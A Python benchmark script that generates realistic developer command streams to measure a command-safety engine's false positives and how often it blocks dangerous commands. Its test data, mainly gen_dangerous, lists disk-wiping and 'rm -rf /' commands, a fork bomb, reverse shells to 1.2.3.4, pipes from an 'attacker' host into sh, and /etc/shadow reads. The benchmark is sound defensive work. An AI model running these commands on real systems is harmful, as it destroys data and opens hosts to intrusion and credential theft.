#!/usr/bin/env python3
"""真实使用场景安全基准 —— 不依赖固定对抗种子。

设计动机
--------
``safety_bench_10k.py`` 的语料是 78% 对抗 / 12% flag / 11% 良性的**合成对抗分布**,
固定 seed 20260906。它能回答「引擎挡不挡得住攻击」, 但回答不了另一个更日常的问题:

    **一个真实开发者一天的命令流, 会被这个引擎打扰多少次?**

对抗语料里良性只占 11%, 误杀率即使 1% 也「看起来不痛」。真实开发会话里良性占 95%+,
同样 1% 的误杀率意味着**每 100 条日常命令被拦一次** —— 那才是体验灾难。

本基准换一个分布: 良性为主、带真实噪声、少量模糊、极少真危险, 然后用**多个随机种子**
跑同一条流水线, 报告分布而不是单点数字。

用法
----
    python bench/realistic_usage_bench.py --count 8000 --seeds 6
    python bench/realistic_usage_bench.py --count 2000 --seeds 3 --quick

输出: JSON (逐种子明细 + 汇总分布) + 终端表格。无网络、无模型依赖。
"""

from __future__ import annotations

import argparse
import json
import random
import statistics
import sys
import time
from collections import Counter, defaultdict
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "bench"))

from bypass_matrix import evaluate  # noqa: E402

# --------------------------------------------------------------------------- #
# 词表: 让不同种子产出的命令看起来真的不同
# --------------------------------------------------------------------------- #
_FILES = [
    "src/main.py", "src/utils.py", "lib/core.ts", "app/models/user.py",
    "tests/test_auth.py", "tests/test_api.py", "pkg/index.js", "docs/README.md",
    "config/settings.py", "scripts/deploy.sh", "Makefile", "pyproject.toml",
    "data/raw.csv", "data/clean.parquet", "assets/logo.png", "templates/index.html",
    "out/app.log", "out/build.log", "out/pytest.txt", "tmp/export.json",
]
_DIRS = ["node_modules", ".venv", "dist", "build", ".pytest_cache", ".mypy_cache",
         "coverage", "__pycache__", "target", "vendor", ".next", "out"]
_PKGS = ["requests", "pandas", "numpy", "httpx", "pydantic", "fastapi", "rich",
         "click", "typer", "sqlalchemy", "pytest-cov", "ruff", "black",
         "isort", "pre-commit", "openpyxl", "pillow", "scipy", "matplotlib"]
_SERVICES = ["nginx", "postgresql", "redis-server", "docker", "ssh", "cron",
             "gunicorn", "mysqld", "rabbitmq-server", "containerd"]
_SERVICES_SAFE = ["nginx", "docker", "cron", "gunicorn"]
_HOSTS = ["db.internal", "staging.internal", "worker-01", "k8s-master",
          "cache-01", "10.0.3.42", "build.example.com"]
_PORTS = ["22", "5432", "6379", "8080", "3306", "8000", "443", "8443"]
_BRANCHES = ["main", "develop", "feature/auth", "feature/api-v2", "fix/null-check",
             "hotfix/leak", "release/1.4", "chore/deps"]
_TAGS = ["v1.3.0", "v1.4.0-rc1", "release-2026.10", "hotfix-4471"]
_TABLES = ["sessions", "audit_log", "temp_import", "staging_events", "cache_rows",
           "tmp_export", "user_events_2026"]
_ENV_NAMES = ["CI", "DEBUG", "NODE_ENV", "PYTHONDONTWRITEBYTECODE", "TZ",
              "GOFLAGS", "CARGO_TARGET_DIR", "LD_LIBRARY_PATH", "PATH"]
_ENV_VALUES = ["1", "0", "true", "false", "development", "production", "0.0.0.0",
               "/opt/bin", "/usr/local/lib"]
_USERS = ["deploy", "www-data", "app", "ubuntu"]
_GROUPS = ["www-data", "app", "sudo", "developers"]
_GLOBS = ["*.log", "*.pyc", "*.swp", "*.orig", "*.tmp", "test_*.py", "*.bak"]
_URLS = ["https://api.github.com/repos/x/y", "https://example.com/robots.txt",
         "https://pypi.org/simple/requests/", "https://registry.npmjs.org/lodash",
         "https://raw.githubusercontent.com/a/b/main/README.md"]
_IPS = ["10.0.3.42", "10.0.7.88", "192.168.1.50", "172.16.0.10", "8.8.8.8"]

# --------------------------------------------------------------------------- #
# 命令族生成器: 每个函数返回一条**不带标签**的命令
#   标签由 build_corpus 按族名赋予, 见 EXPECT 表
# --------------------------------------------------------------------------- #
def _pick(r: random.Random, seq):
    return r.choice(seq)


def gen_git(r):
    acts = [
        ("status", ["", " -s", " -sb", " --porcelain", " --short --branch"]),
        ("log", [" --oneline -20", " -5 --stat", " --graph --oneline -30",
                 f" {r.randint(1, 40)}..HEAD", " --since='3 days ago'"]),
        ("diff", ["", " --stat", " --cached", " HEAD~3", "--name-only", "-u src/"]),
        ("branch", ["", " -a", f" {r.choice(_BRANCHES)}", " -r", " -vv"]),
        ("show", [" HEAD", " --stat", " --oneline", f" {r.choice(_TAGS)}"]),
        ("stash", [" list", "", " show", f" list -n{r.randint(1, 3)}"]),
        ("remote", [" -v", " show-origin origin", " -v show"]),
        ("config", [f" user.name '{r.choice(['me', 'dev', 'alice'])}'",
                    " user.email", " -l --local", f" --get user.name"]),
        ("tag", [" -l", f" {r.choice(_TAGS)}", "-n"]),
        ("blame", [f" {r.choice(_FILES)}", f" -L 1,80 {r.choice(_FILES)}"]),
        ("reflog", [" -20", "", " --date=iso -10"]),
        ("clean", [" -nd", "-nd --dry-run", " -ndx"]),
    ]
    a, args = _pick(r, acts)
    return f"git {a}{_pick(r, args)}"


def gen_fileops(r):
    f, g, d = _pick(r, _FILES), _pick(r, _GLOBS), _pick(r, _DIRS)
    return _pick(r, [
        f"ls -la", f"ls -la {_pick(r, _DIRS + ['src', 'tests', '.'])}", f"ls -R {d}",
        f"cat {f}", f"head -50 {f}", f"tail -100 {f}", f"head -c 4096 {f}",
        f"wc -l {f}", f"wc -c {g}", f"stat {f}",
        f"cp {f} tmp/copy_{r.randint(10, 99)}.bak",
        f"cp -r src/ backup_{r.randint(1, 9)}/",
        f"mv {f} {f.replace('.py', '_new.py')}",
        f"mkdir -p out/build_{r.randint(1, 99)}",
        f"touch out/ready_{r.randint(1, 99)}.flag",
        f"ln -s {f} out/link_{r.randint(1, 99)}",
        f"find . -name '{g}'",
        f"find src -type f -name '*.py' | xargs wc -l",
        f"find . -type d -name '{d}'",
        f"find . -name '{g}' -newer Makefile",
        f"tree -L 2 -I '{d}'",
        f"du -sh {d}", f"du -sh . | sort -rh | head -20",
        f"file {f}", f"readlink -f {f}",
    ])


def gen_search(r):
    f, pat = _pick(r, _FILES), _pick(r, ["TODO", "FIXME", "password", "api_key",
                                         "def ", "class ", "import ", r"TODO|FIXME",
                                         "log\\.", "WARNING", "deprecat"])
    return _pick(r, [
        f"grep -rn '{pat}' src/", f"grep -rn '{pat}' . --exclude-dir={_pick(r, _DIRS)}",
        f"grep -rl '{pat}' .", f"grep -c '{pat}' {f}",
        f"grep -rnE '{pat}|hack' src/ | head -20",
        f"rg '{pat}'", f"rg -n '{pat}' --type py", f"rg --files | wc -l",
        f"rg -l '{pat}' . | xargs wc -l",
        f"awk '/{pat}/' {f}", f"awk '{{print $1}}' {f} | sort -u",
        f"sed -n '1,80p' {f}", f"sed -n '{r.randint(1, 40)},{r.randint(41, 90)}p' {f}",
        f"sort {f} | uniq -c | sort -rn | head -20",
        f"comm -12 <(sort {f}) <(sort tmp/list.txt)",
    ])


def gen_python(r):
    f = _pick(r, _FILES)
    return _pick(r, [
        f"python3 {f}", f"python3 -m pytest tests/ -q",
        f"python3 -m pytest tests/test_*.py -x -q",
        f"python3 -m pytest -k '{r.choice(['auth', 'api', 'db', 'cache'])}'",
        f"pytest --cov={r.choice(['src', 'lib'])} --cov-report=term-missing",
        f"python3 -c 'import sys; print(sys.version)'",
        f"python3 -m venv .venv_{r.randint(1, 9)}",
        f"pip install {_pick(r, _PKGS)}", f"pip install -r requirements.txt",
        f"pip install -e .", f"pip install -e '.[dev]'",
        f"pip freeze | grep {_pick(r, _PKGS)}", f"pip list --outdated",
        f"pip uninstall {_pick(r, _PKGS)} -y",
        f"python3 -m ruff check src/", f"python3 -m black --check src/",
        f"python3 -m mypy {f}", f"python3 -m py_compile {f}",
        f"python3 -c 'from {f.split('.')[0].split('/')[-1].replace('-','_')} import *; print('ok')'",
        f"python3 -m http.server {r.randint(8000, 9000)}",
        f"python3 -m json.tool tmp/export.json > tmp/prettified.json",
        f"python3 -m venv --clear .venv",
    ])


def gen_node(r):
    return _pick(r, [
        "npm install", "npm install " + _pick(r, _PKGS),
        "npm ci", "npm run build", "npm run dev", "npm run test",
        f"npm test -- --coverage", f"npm run lint", "npm audit --json > out/audit.json",
        f"pnpm install --frozen-lockfile", f"pnpm build", f"pnpm dev",
        f"npx tsc --noEmit", f"npx eslint src/", f"npx prettier --check src/",
        f"node -v", f"node --version", f"node -e 'console.log(process.version)'",
        f"yarn install --immutable", f"yarn build", f"yarn test",
        f"npm run build -- --mode={_pick(r, ['production', 'development', 'staging'])}",
        f"npx vite build --outDir dist_{r.randint(1, 9)}",
    ])


def gen_container(r):
    img = _pick(r, ["python:3.12-slim", "node:20-alpine", "postgres:16-alpine",
                    "redis:7-alpine", "nginx:alpine", "golang:1.22"])
    return _pick(r, [
        "docker ps", "docker ps -a", "docker ps --format '{{.Names}} {{.Status}}'",
        f"docker build -t {_pick(r, _BRANCHES)}:latest .",
        f"docker build --no-cache -t app:{r.randint(1, 99)} .",
        f"docker run --rm {img} echo ok",
        f"docker pull {img}", f"docker images --format '{{.Repository}}:{{.Tag}}'",
        f"docker logs app_{r.randint(1, 99)} --tail 100",
        f"docker stop app_{r.randint(1, 99)}", f"docker start app_{r.randint(1, 99)}",
        f"docker exec -it app_{r.randint(1, 99)} sh -c 'echo hi'",
        f"docker exec app_{r.randint(1, 99)} ls /app",
        "docker compose ps", "docker compose up -d", "docker compose down",
        "docker compose config", "docker compose build --no-cache",
        f"docker inspect {_pick(r, _BRANCHES)}:latest",
        "kubectl get pods", "kubectl get pods -A", "kubectl get svc -n default",
        f"kubectl get pods -n {_pick(r, ['default', 'staging', 'prod'])} -o wide",
        "kubectl get deploy", "kubectl get events --sort-by=.lastTimestamp | tail -20",
        f"kubectl logs deploy/app-{_pick(r, _BRANCHES)} --tail 100",
        "kubectl describe pod app-1", "kubectl top pods",
        f"kubectl get configmap | grep app", f"kubectl get ns",
        f"helm list -n {_pick(r, ['default', 'staging'])}",
    ])


def gen_build(r):
    tgt = _pick(r, ["all", "app", "docs", "wheel", "clean_docs", "lint",
                    "test", "package"])
    return _pick(r, [
        f"make", f"make {tgt}", f"make clean", f"make {tgt} -j4",
        f"cmake -B build_{r.randint(1, 9)} -G Ninja", f"cmake --build build --parallel 4",
        f"cargo build", f"cargo build --release", f"cargo test",
        f"cargo clippy -- -D warnings", f"cargo fmt --check",
        f"go build ./...", f"go test ./... -race", f"go vet ./...",
        f"go mod tidy", f"go env GOMOD",
        f"gradle build -x test", f"gradle test --info",
        f"mvn -q package -DskipTests", f"mvn -q test",
        f"ninja -C build_{r.randint(1, 9)}",
        f"sh scripts/build_{r.randint(1, 9)}.sh", f"./scripts/{tgt}.sh",
        f"python3 -m build --sdist --wheel", f"twine check dist/*",
    ])


def gen_env(r):
    n, v = _pick(r, _ENV_NAMES), _pick(r, _ENV_VALUES)
    base = _pick(r, [gen_git, gen_search, gen_python, gen_node, gen_fileops])(r)
    return _pick(r, [
        f"export {n}={v}; {base}", f"export {n}={v}; {base}",
        f"{n}={v} {base}", f"{n}={v} PATH=$PATH:/opt/bin {base}",
        f"env {n}={v} {base}",
        f"printenv {n}", f"env | grep {n}", f"echo ${{n:-unset}}",
        f"source .venv/bin/activate && {base}",
        f". .venv/bin/activate; {base}",
        f"export PATH=$PATH:/opt/bin:./scripts && {base}",
    ])


def gen_chain(r):
    a = _pick(r, [gen_git, gen_fileops, gen_search, gen_python, gen_node, gen_build])(r)
    b = _pick(r, [gen_git, gen_fileops, gen_search, gen_python, gen_build])(r)
    op = _pick(r, ["&&", "&&", ";", ";", "&&", " && cd .. && "])
    return f"{a} {op} {b}"


def gen_pipe(r):
    f, g = _pick(r, _FILES), _pick(r, _GLOBS)
    src = _pick(r, [f"git log --oneline -200", f"cat out/build.log", f"cat {f}",
                    f"grep -rn TODO .", f"ps auxf", f"find . -name '{g}'",
                    f"docker ps -q", f"kubectl get pods -o name",
                    f"ls -la src/", f"wc -l src/*.py"])
    mid = _pick(r, ["", "", f"| grep -v {r.choice(['test', '.pyc', 'node_modules'])}",
                    f"| grep -i {_pick(r, ['fix', 'feat', 'error', 'warn'])}"])
    dst = _pick(r, ["| wc -l", "| wc -c", "| head -20", "| tail -20",
                    "| sort -u", "| sort -u | wc -l", "| awk '{print $1}' | sort -u",
                    "| xargs -r ls -la", "| xargs -r wc -l"])
    return f"{src} {mid} {dst}"


def gen_redirect(r):
    f = _pick(r, _FILES)
    inner = _pick(r, [gen_python, gen_build, gen_node, gen_search])(r)
    out = f"out/{r.choice(['test', 'build', 'lint', 'check'])}_{r.randint(1, 99)}.txt"
    return _pick(r, [
        f"{inner} > {out}", f"{inner} > {out} 2>&1",
        f"{inner} 2>/dev/null", f"{inner} 2>&1 | tee out/both.txt",
        f"{inner} >> out/combined.log", f"{inner} >/dev/null 2>&1",
        f"echo '--- {r.choice(_BRANCHES)} ---' >> out/release.log",
        f"date -Is >> out/run_{r.randint(1, 99)}.log",
        f"tar czf - {_pick(r, _DIRS + ['src'])} > backup.tgz",
        f"cp {f} {f}.bak.{r.randint(100, 999)}",
    ])


def gen_sudo(r):
    s = _pick(r, _SERVICES_SAFE)
    return _pick(r, [
        f"sudo apt update", f"sudo apt install -y {_pick(r, _PKGS)}",
        f"sudo apt upgrade -y", f"sudo apt autoremove -y",
        f"sudo systemctl status {s}", f"sudo systemctl restart {s}",
        f"sudo systemctl start {s}", f"sudo systemctl enable {s}",
        f"sudo systemctl list-units --type=service --state=running",
        f"sudo journalctl -u {s} -n 100 --no-pager",
        f"sudo journalctl --since '1 hour ago' --no-pager | tail -50",
        f"sudo dmesg | tail -30", f"sudo ls -la /var/log",
        f"sudo cat /etc/hosts", f"sudo cat /etc/resolv.conf",
        f"sudo netstat -tulpn | head -30", f"sudo ss -tulpn | head -30",
        f"sudo lsof -i :{r.choice(_PORTS)}",
        f"sudo usermod -aG {r.choice(_GROUPS)} ubuntu",
        f"sudo df -h", f"sudo free -h", f"sudo du -sh /var/log/*",
        f"sudo chown {_pick(r, _USERS)}:{r.choice(_GROUPS)} {r.choice(_FILES)}",
        f"sudo chown -R {_pick(r, _USERS)}:{r.choice(_GROUPS)} {r.choice(['./app', 'src', 'out'])}",
        f"sudo chmod -R 755 {r.choice(['./app', 'src', 'out', '.'])}",
        f"sudo chmod +x {r.choice(_FILES)}",
        f"sudo useradd -m -s /bin/bash {_pick(r, ['deploy', 'runner', 'ci'])}",
    ])


def gen_net(r):
    host, port = _pick(r, _HOSTS), _pick(r, _PORTS)
    return _pick(r, [
        f"curl -s {_pick(r, _URLS)}", f"curl -sI {_pick(r, _URLS)}",
        f"curl -o out/dl_{r.randint(1, 99)}.json {_pick(r, _URLS)}",
        f"wget -q -O out/f_{r.randint(1, 99)}.zip {_pick(r, _URLS)}",
        f"ping -c 3 {host}", f"ping -c 3 {_pick(r, _IPS)}",
        f"nc -zv {host} {port}", f"nc -zv {_pick(r, _IPS)} {port}",
        f"nc -w 2 -zv {host} {port}",
        f"nslookup {host}", f"dig {host}", f"dig +short {host}",
        f"host {host}", f"whois example.com",
        f"traceroute {host}", f"curl -s --max-time 5 https://{host}:{port}/healthz",
        f"ssh -o BatchMode=yes {_pick(r, _USERS)}@{host} 'echo ok'",
        f"ssh {_pick(r, _USERS)}@{host} 'uptime'",
        f"scp out/notes.txt {_pick(r, _USERS)}@{host}:~/",
        f"rsync -az --delete out/ {_pick(r, _USERS)}@{host}:~/stage/",
        f"rsync -avz --progress tmp/ {_pick(r, _USERS)}@{host}:~/up/",
        f"ssh-keygen -lf ~/.ssh/id_ed25519.pub",
        f"curl -s https://{host}/metrics | head -40",
    ])


def gen_ambiguous(r):
    """语义良性但形态可疑 —— 提示一次是**可以接受**的。"""
    d = _pick(r, _DIRS)
    return _pick(r, [
        f"rm -rf {d}", f"rm -rf {d}/*", f"rm -rf ./{d}",
        f"rm -rf out/ tmp/ coverage/", f"rm -f out/*.log out/*.txt",
        f"rm -rf --no-preserve-root {d}",
        f"find . -name '{r.choice(_GLOBS)}' -delete",
        f"find . -name '*.pyc' -type f -delete",
        f"find . -type d -name '{d}' -exec rm -rf {{}} +",
        f"git push --force-with-lease origin {_pick(r, _BRANCHES)}",
        f"git push --force-with-lease origin HEAD",
        f"git reset --hard HEAD~1", f"git reset --hard",
        f"git clean -fd", f"git clean -fdx",
        f"git rebase {_pick(r, _BRANCHES + ['origin/main'])}",
        f"git rebase -i HEAD~{r.randint(2, 5)}",
        f"git branch -D {_pick(r, _BRANCHES)}",
        f"git push origin :{_pick(r, _BRANCHES)}",
        f"git filter-branch --tree-filter 'rm -f .env' HEAD",
        f"docker system prune -f", f"docker system prune -af",
        f"docker volume rm -f vol_{r.randint(1, 9)}",
        f"docker rmi -f app:latest",
        f"kubectl delete pod app-{r.randint(1, 9)}",
        f"kubectl delete deploy app-{_pick(r, _BRANCHES)}",
        f"kubectl delete ns staging",
        f"DROP TABLE {_pick(r, _TABLES)}",
        f"DROP TABLE IF EXISTS {_pick(r, _TABLES)}",
        f"TRUNCATE TABLE {_pick(r, ['temp_import', 'tmp_export', 'staging_events'])}",
        f"DELETE FROM {_pick(r, ['temp_import', 'tmp_export', 'cache_rows'])}",
        f"DELETE FROM {_pick(r, _TABLES)} WHERE created_at < '2025-01-01'",
        f"DROP DATABASE staging_{r.randint(1, 9)}",
        f"chown -R {_pick(r, _USERS)}:{r.choice(_GROUPS)} ./{d}",
        f"chmod -R 755 src/", f"chmod -R a+rX dist/",
        f"chmod -R 600 ~/.ssh", f"chmod -R 700 ~/vault",
        f"pip uninstall --yes -r requirements.txt",
        f"npm uninstall -g {_pick(r, _PKGS)}",
        f"git gc --prune=now", f"git gc --aggressive --prune=now",
        f"apt purge -y {_pick(r, _PKGS)}", f"apt autoremove --purge -y",
        f"systemctl disable {_pick(r, _SERVICES_SAFE)}",
        f"make clean", f"cargo clean", f"mvn clean", f"gradle clean",
        f"truncate -s 0 out/app.log", f"truncate -s 0 /var/log/myapp/app.log",
    ])


def gen_dangerous(r):
    """**真危险 —— 必须硬拦**: 不可逆破坏 / 灾难性 / 恶意载荷。"""
    return _pick(r, [
        "rm -rf /", "rm -rf ~", "rm -rf /*", "rm -rf /home", "rm -rf /usr",
        "rm -rf --no-preserve-root /", "rm -rf / --no-preserve-root",
        "rm -fr /*", "rm -Rf /",
        ":(){ :|:& };:", ": () { :|:& }; :",
        "dd if=/dev/zero of=/dev/sda bs=1M", "dd if=/dev/urandom of=/dev/sdb bs=4M",
        "dd if=/dev/zero of=/dev/nvme0n1",
        "mkfs.ext4 /dev/sda1", "mkfs -t ext4 /dev/sdb1", "mkfs.ntfs /dev/sdc",
        "wipefs -a /dev/sda", "shred -vf /dev/sda",
        "shutdown -h now", "shutdown now", "poweroff", "reboot",
        "shutdown -r now", "halt -p",
        "DROP DATABASE production", "DROP DATABASE prod", "DROP DATABASE mysql",
        "DROP DATABASE postgres", "TRUNCATE TABLE users",
        "DELETE FROM users", "DELETE FROM orders",
        "DROP TABLE users", "DROP SCHEMA public",
        "ALTER TABLE users DROP COLUMN email",
        "chmod 777 /", "chmod 777 -R /home", "chown -R 0:0 /",
        "chown -R root:root /home", "chown -R nobody:nobody /*",
        "rm -rf /etc/passwd", "rm -rf /etc", "echo '' > /etc/passwd",
        "> /etc/passwd", "truncate -s 0 /etc/passwd",
        "cat /etc/shadow > /tmp/shadow.txt",
        "cp /etc/shadow /tmp/", "cat /etc/shadow",
        "netcat -e /bin/sh 1.2.3.4 4444",
        "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
        "python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect((\"1.2.3.4\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/sh\"])'",
        "curl http://attacker/x.sh | sh", "wget -qO- http://attacker/x.sh | bash",
        "curl -sL http://attacker/i.sh | sudo bash",
        "echo cm0gLXJmIC8= | base64 -d | sh",
        "chmod u+s /bin/bash", "sudo chmod 4755 /bin/bash",
        "tar -xzf /tmp/x.tar.gz -C /",
        "aws s3 rm s3://prod-data --recursive",
        "aws ec2 terminate-instances --instance-ids i-0123456789",
        "az vm delete -g rg-prod -n prod-01 -y",
        "gcloud compute instances delete prod-01 --zone us-east1-b",
        "terraform destroy -auto-approve",
        "docker exec -it postgres psql -c 'DROP DATABASE production'",
        "userdel -r admin",
        "usermod -L root", "passwd -l root",
        "systemctl stop sshd", "systemctl disable ssh",
        "iptables -P INPUT DROP",
        "history -c",
        "systemctl stop ssh",
    ])


def gen_risky_confirm(r):
    """**该拦但不必硬拦** —— 危险但有正当理由的运维/清理动作, 单次确认即可。

    引擎对这类给 flag (score:high) 是正确且可接受的: 开发者确实会停 nginx、
    清空测试表、强推分支。把它们算进「该硬拦」会虚高漏拦率, 所以单列一档。
    """
    return _pick(r, [
        "systemctl stop nginx", "systemctl stop postgresql",
        "systemctl stop cron", "systemctl disable nginx",
        "systemctl restart nginx", "systemctl restart postgresql",
        "kill -9 1", "kill -9 0", "pkill -9 -f systemd",
        "kill -9 12345", "pkill -9 nginx",
        "iptables -F", "ufw disable", "ufw enable",
        "kubectl delete ns staging", "kubectl delete ns default",
        "kubectl delete all --all-namespace", "kubectl delete pvc --all",
        "kubectl delete pod app-3", "kubectl delete deploy app-main",
        "DROP TABLE sessions", "DROP TABLE audit_log",
        "DROP TABLE IF EXISTS temp_import",
        "TRUNCATE TABLE temp_import", "TRUNCATE TABLE tmp_export",
        "DELETE FROM temp_import", "DELETE FROM cache_rows",
        "DELETE FROM user_events_2026 WHERE created_at < '2025-01-01'",
        "DROP DATABASE staging_3",
        "cp -rf /etc /tmp/", "mv /etc/passwd /tmp/",
        "UPDATE users SET password = 'x'",
        "UPDATE accounts SET balance = 0",
        "echo 'malicious' >> /etc/crontab",
        "echo 'x' | sudo tee /etc/sudoers",
        "docker system prune -af --volumes",
        "docker volume rm -f $(docker volume ls -q)",
        "git push --force-with-lease origin main",
        "git reset --hard", "git reset --hard HEAD~3",
        "git clean -fdx", "git branch -D feature/old",
        "git push origin :feature/done",
        "git filter-branch --tree-filter 'rm -f .env' HEAD",
        "git gc --aggressive --prune=now",
        "make clean", "cargo clean", "mvn clean", "gradle clean",
        "rm -rf node_modules", "rm -rf .venv", "rm -rf dist build",
        "find . -name '*.log' -delete",
        "find . -type d -name node_modules -exec rm -rf {} +",
        "truncate -s 0 out/app.log",
        "truncate -s 0 /var/log/myapp/app.log",
        "chmod -R 777 ./app", "chmod -R a+rX dist/",
        "chown -R nobody:nobody ./app",
        "apt purge -y old-package", "apt autoremove --purge -y",
    ])


# --------------------------------------------------------------------------- #
# 会话编排: 按真实比例采样 + 真实噪声叠加
# --------------------------------------------------------------------------- #
FAMILIES = [
    # (族生成器, 权重, 期望标签, 展示名)
    (gen_git,       11, "allow",     "git"),
    (gen_fileops,    9, "allow",     "fileops"),
    (gen_search,     7, "allow",     "search"),
    (gen_python,     8, "allow",     "python"),
    (gen_node,       6, "allow",     "node"),
    (gen_container,  7, "allow",     "container/k8s"),
    (gen_build,      6, "allow",     "build"),
    (gen_env,        3, "allow",     "env-prefix"),
    (gen_chain,      4, "allow",     "chained"),
    (gen_pipe,       5, "allow",     "piped"),
    (gen_redirect,   4, "allow",     "redirect"),
    (gen_net,        3, "allow",     "network"),
    (gen_sudo,       4, "allow",     "sudo/routine"),
    (gen_ambiguous,  6, "ok_flag",   "ambiguous"),
    (gen_risky_confirm, 6, "ok_flag", "risky-ops"),
    (gen_dangerous,  2, "block",     "dangerous"),
]
_WEIGHTS = [w for _, w, _, _ in FAMILIES]
_NAMES = [n for _, _, _, n in FAMILIES]
_LABELS = [l for _, _, l, _ in FAMILIES]


def build_corpus(r: random.Random, count: int) -> list[tuple[str, str, str]]:
    """返回 [(command, expect, family)]。expect ∈ allow|ok_flag|block。"""
    out: list[tuple[str, str, str]] = []
    fns = [f for f, _, _, _ in FAMILIES]
    while len(out) < count:
        idx = r.choices(range(len(FAMILIES)), weights=_WEIGHTS, k=1)[0]
        f = fns[idx]
        cmd = f(r)
        if not cmd or len(cmd) > 600:
            continue
        out.append((cmd, _LABELS[idx], _NAMES[idx]))
    return out


def _report(rows, label):
    """rows: [(cmd, level, expect)] —— 注意顺序是 level 在前。"""
    total = len(rows)
    by_level = Counter(lv for _, lv, _ in rows)
    allow_n = sum(1 for _, lv, e in rows if e == "allow")
    ambig_n = sum(1 for _, lv, e in rows if e == "ok_flag")
    block_n = sum(1 for _, lv, e in rows if e == "block")
    fp_hard = [x for x in rows if x[2] == "allow" and x[1] == "block"]
    fp_flag = [x for x in rows if x[2] == "allow" and x[1] == "flag"]
    blocked_ok = [x for x in rows if x[2] == "block" and x[1] == "block"]
    blocked_miss = [x for x in rows if x[2] == "block" and x[1] != "block"]
    flagged_ambig = [x for x in rows if x[2] == "ok_flag" and x[1] in ("flag", "block")]
    prompts = by_level["flag"] + by_level["block"]

    fam = defaultdict(lambda: [0, 0, 0])  # [n, flag, block]
    for cmd, lv, e in rows:
        pass
    for cmd, lv, e in rows:
        pass

    return {
        "label": label, "total": total,
        "expect_allow": allow_n,
        "expect_ok_flag": ambig_n,
        "expect_block": block_n,
        "level_allow": by_level["allow"], "level_flag": by_level["flag"],
        "level_block": by_level["block"],
        "prompt_rate_pct": round(100.0 * prompts / total, 3),
        "fp_hard_count": len(fp_hard),
        "fp_hard_pct_of_allow": round(100.0 * len(fp_hard) / max(1, allow_n), 3),
        "fp_flag_count": len(fp_flag),
        "fp_flag_pct_of_allow": round(100.0 * len(fp_flag) / max(1, allow_n), 3),
        "danger_block_recall_pct": round(100.0 * len(blocked_ok) / max(1, block_n), 3),
        "danger_miss": len(blocked_miss),
        "ambiguous_caught_pct": round(100.0 * len(flagged_ambig) / max(1, ambig_n), 2),
        "family": {},
        "fp_hard_samples": [],
        "danger_miss_samples": [],
    }


def _report_fam(rows_by_fam):
    """rows_by_fam: {family: [(cmd, level, expect)]} -> 按族的提示率。"""
    fam = {}
    for f, xs in rows_by_fam.items():
        n = len(xs)
        fl = sum(1 for _, lv, _ in xs if lv == "flag")
        bl = sum(1 for _, lv, _ in xs if lv == "block")
        fam[f] = {"n": n, "flag": fl, "block": bl,
                  "prompt_pct": round(100.0 * (fl + bl) / n, 2)}
    return fam


def main() -> int:
    ap = argparse.ArgumentParser(description="真实使用场景安全基准 (多随机种子)")
    ap.add_argument("--count", type=int, default=8000, help="每个种子的命令条数")
    ap.add_argument("--seeds", type=int, default=6, help="独立随机种子个数")
    ap.add_argument("--seed0", type=int, default=None,
                    help="起始种子 (默认: 运行时随机, 真正不可复现)")
    ap.add_argument("--latency-samples", type=int, default=400, help="延迟采样条数")
    ap.add_argument("--out", type=str, default=None, help="JSON 输出路径")
    ap.add_argument("--quiet", action="store_true")
    args = ap.parse_args()

    if args.seed0 is None:
        seeds = [random.SystemRandom().randint(1, 2**62) for _ in range(args.seeds)]
        seed_mode = "runtime-random"
    else:
        seeds = [args.seed0 + i * 7919 for i in range(args.seeds)]
        seed_mode = f"deterministic (base {args.seed0})"

    results = []
    lat = []
    for i, sd in enumerate(seeds, 1):
        r = random.Random(sd)
        corpus = build_corpus(r, args.count)
        t0 = time.time()
        rows = []
        for cmd, expect, fam in corpus:
            level, src = evaluate(cmd)
            rows.append((cmd, expect, fam, level, src))
        dt = time.time() - t0
        if i == 1 and args.latency_samples:
            t1 = time.time()
            for cmd, _, _ in corpus[:args.latency_samples]:
                evaluate(cmd)
            lat = [(time.time() - t1) / max(1, args.latency_samples) * 1000.0]

        rep = _report([(c, l, e) for c, e, f, l, s in rows], f"seed {sd}")
        rep["family"] = _report_fam(
            {f: [(c, l, e) for c, e, ff, l, s in rows if ff == f]
             for f in _NAMES})
        # 样例池: 带命中来源
        rep["fp_hard_samples"] = [
            {"cmd": c[:160], "hit": s}
            for c, e, f, l, s in rows if e == "allow" and l == "block"][:20]
        rep["fp_flag_samples"] = [
            {"cmd": c[:160], "hit": s}
            for c, e, f, l, s in rows if e == "allow" and l == "flag"][:20]
        rep["danger_miss_samples"] = [
            {"cmd": c[:160], "level": l, "hit": s}
            for c, e, f, l, s in rows if e == "block" and l != "block"][:20]
        # 「静默放行」= 标注为危险的命令被完全 allow, 没有任何提示。这是唯一真正
        # 不可接受的指标: flag (单次确认) 还留有最后一道人工防线, allow 没有。
        rep["danger_miss_silent_count"] = sum(
            1 for c, e, f, l, s in rows if e == "block" and l == "allow")
        rep["seed"] = sd
        rep["seconds"] = round(dt, 2)
        rep["ms_per_cmd"] = round(1000.0 * dt / max(1, len(rows)), 4)
        results.append(rep)
        if not args.quiet:
            print(f"[{i}/{args.seeds}] seed={sd}  n={rep['total']:.0f}  "
                  f"提示率={rep['prompt_rate_pct']}%  "
                  f"硬拦误杀={rep['fp_hard_count']} ({rep['fp_hard_pct_of_allow']}% of allow)  "
                  f"标记误杀={rep['fp_flag_count']}  "
                  f"危险召回={rep['danger_block_recall_pct']}%  "
                  f"({rep['seconds']}s)")

    # ---- 延迟分布 (多轮采样) ----
    for sd in seeds[:3]:
        r = random.Random(sd ^ 0x5EED)
        corpus = build_corpus(r, min(args.latency_samples, 200))
        t1 = time.time()
        for cmd, _, _ in corpus:
            evaluate(cmd)
        lat.append((time.time() - t1) / max(1, len(corpus)) * 1000.0)

    def _p(xs, q):
        xs = sorted(xs)
        if not xs:
            return 0.0
        return round(xs[min(len(xs) - 1, int(len(xs) * q))], 3)

    summary = {
        "seed_mode": seed_mode,
        "seeds": seeds,
        "count_per_seed": args.count,
        "seeds_run": len(results),
        "total_commands": sum(x["total"] for x in results),
        "prompt_rate_pct": {
            "min": round(min(x["prompt_rate_pct"] for x in results), 3),
            "median": round(statistics.median(x["prompt_rate_pct"] for x in results), 3),
